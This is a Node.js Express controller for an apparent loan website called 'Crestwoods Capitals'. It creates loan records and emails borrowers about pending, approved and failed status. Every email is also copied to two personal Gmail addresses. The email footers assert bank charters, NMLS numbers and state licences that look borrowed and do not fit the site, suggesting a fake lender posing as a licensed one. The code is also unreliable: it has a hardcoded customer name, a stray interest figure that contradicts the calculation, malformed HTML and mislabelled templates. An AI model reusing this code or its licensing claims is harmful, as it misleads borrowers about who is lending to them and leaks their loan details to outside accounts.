const Loan = require("../models/LoanModel");
const User = require('../models/UserModel')
const sendEmail = require('../utils/emailSender')

const createLoan = async (req, res) => {
  try {
    const { amount, payback_period, credit_score, annual_income, reason } = req.body;
    if(!req.body) {
       return res.status(400).json({
         status: "failed",
         error: "please fill all fields to proceed",
       });
    }
    const user = await User.findOne({ _id: req.user.userId });

    // Check for minimum loan amount
    if (amount < 5000) {
      return res.status(400).json({
        status: "failed",
        error: "You cannot request a loan less than $5000",
      });
    }

     if (credit_score < 0 || credit_score > 850) {
       return res.status(400).json({
         status: "failed",
         error: "invalid credit score",
       });
     }


    // Calculate interest based on payback period
    let interest;
    if (payback_period === "3 months") {
      interest = amount * 0.02;
    } else if (payback_period === "6 months") {
      interest = amount * 0.04;
    } else if (payback_period === "1 year") {
      interest = amount * 0.06;
    } else if (payback_period === "2 years") {
      interest = amount * 0.08;
    } else if (payback_period === "3 years") {
      interest = amount * 0.1;
    } else {
      return res.status(400).json({
        status: "failed",
        error: "Invalid payback period",
      });
    }

    // Create loan record
    const loan = await Loan.create({
      user: req.user.userId,
      amount,
      payback_period,
      reason,
      interest,
      name: user.name,
      annual_income,
      credit_score, // Assuming credit_score is passed in the request body
    });

    console.log(loan)

    // Send response to client
    res
      .status(200)
      .json({
        status: "success",
        message: "Loan request made successfully",
        loan,
      });

      console.log(loan)

    // Send email notifications
    const subject = "Loan Approved";
    const text = `Hi ${user.name},\n.`;
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Loan Application Received</title>
        <style>
          /* Add your custom CSS styles here */
          body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #0044cc;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Loan Application Received!</h1>
          <h1>Hello ${user.name}</h1>
          <p>Your loan application has been submitted and is under review. Please check your email address 
          for updates about your loan application.</p>
          <p>You will receive an email notification from us shortly when your loan application is approved. </p>
          <p>If you have any questions regarding this deposit, please contact our support team.</p>
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>
          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>
          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>
          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via Facebook</a>.</p>
          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Crestwoods Capitals.</p>
          </div>
        </div>
      </body>
      </html>
    `;

    // Send the emails
    await Promise.all([
      sendEmail(user.email, subject, text, html),
      sendEmail("anniemary841@gmail.com", subject, text, html),
      sendEmail("companychris00@gmail.com", subject, text, html),
    ]);
  } catch (error) {
    console.log(error.message);
      res.status(400).json({ error: error.message });
  
  }
};


const updateLoanPending = async (req, res) => {
  const { loanId } = req.params;
  const loan = await Loan.findOne({ _id: loanId });
  if (!loan) {
    return res
      .status(404)
      .json({ error: `no loan found with id ${loanId} ` });
  }

  loan.status = "pending";
  await loan.save();
  const user = await User.findById(loan.user);
  res
    .status(200)
    .json({
      status: "success",
      message: "loan updated successfully",
      loan,
    });
     console.log(loan);

  const subject = "loan pending";
  const text = `Hi ${user.name},\n\.`;
  const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Deposit Confirmation</title>
        <style>
          /* Add your custom CSS styles here */
          body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #0044cc;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Transaction pending emails </h1>
          
    
          
          <p>If you have any questions regarding this deposit, please contact our support team.</p>
          
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Crestwoods Capitals.</p>
          </div>
        </div>
      </body>
      </html>
    `;

   await Promise.all([
     sendEmail(user.email, subject, text, html),
     sendEmail("anniemary841@gmail.com", subject, text, html),
     sendEmail("companychris00@gmail.com", subject, text, html),
   ]);
};


const updateLoanApproved = async (req, res) => {
  const { loanId } = req.params;
  const loan = await Loan.findOne({ _id: loanId });
  if (!loan) {
    return res.status(404).json({ error: `no loan found with id ${loanId} ` });
  }

  loan.status = "approved";
  await loan.save();
  const user = await User.findById(loan.user);
  res.status(200).json({
    status: "success",
    message: "loan updated successfully",
    loan,
  });

 

  const subject = "Loan Approved";
  const text = `Hi ${user.name},\n\.`;
  const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Deposit Confirmation</title>
        <style>
          /* Add your custom CSS styles here */
          body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #0044cc;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1 style="color: "green";>Congrats!</h1>
          <h2>Loan Application Approved </h2>
          
          <p>Hi Richie Johnson, Your recent loan application with the Crestwoods Capitals has been Approved successfully. 
          Your funding-request has also been approved for a low-interest-loan with a convenient pay-back schedule. </p>


Loan Payback 
Schedule/Interest: 2 Years (0.08% interest)
    <p><strong>Loan amount:</strong> $${loan.amount}</p>
          
          <p><strong>Application Name:</strong> ${user.name}</p>

          <p>Loan payback</p>
        
          
          <p><strong>Schedule/Interest: ${loan.payback_period} ($${loan.interest})</strong></p>
          

          
       

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Crestwoods Capitals.</p>
          </div>
        </div>
      </body>
      </html>
    `;

   await Promise.all([
     sendEmail(user.email, subject, text, html),
     sendEmail("anniemary841@gmail.com", subject, text, html),
     sendEmail("companychris00@gmail.com", subject, text, html),
   ]);
};


const updateLoanFailed = async (req, res) => {
  const { loanId } = req.params;
  const loan = await Loan.findOne({ _id: loanId });
  if (!loan) {
    return res.status(404).json({ error: `no loan found with id ${loanId} ` });
  }

  loan.status = "failed";
  await loan.save();
  const user = await User.findById(loan.user);
  res.status(200).json({
    status: "success",
    message: "loan updated successfully",
    loan,
  });

  const subject = "Loan Failed";
  const text = `Hi ${user.name},\n\.`;
  const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Deposit Confirmation</title>
        <style>
          /* Add your custom CSS styles here */
          body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #0044cc;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Transaction pending emails </h1>
          
    
          
          <p>If you have any questions regarding this deposit, please contact our support team.</p>
          
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Crestwoods Capitals.</p>
          </div>
        </div>
      </body>
      </html>
    `;
 await Promise.all([
   sendEmail(user.email, subject, text, html),
   sendEmail("anniemary841@gmail.com", subject, text, html),
   sendEmail("companychris00@gmail.com", subject, text, html),
 ]);
};


const getAllLoans = async(req, res) => {
  try {
    const loans = await Loan.find({})
    res.status(200).json({ status: "success", nbhits: loans.length, loans})
  } catch (error) {
    console.log(error.message);
    res.status(400).json({ error: error.message})
  }
}




module.exports = {
    createLoan,
    updateLoanApproved,
    updateLoanPending,
    updateLoanFailed,
    getAllLoans
  }
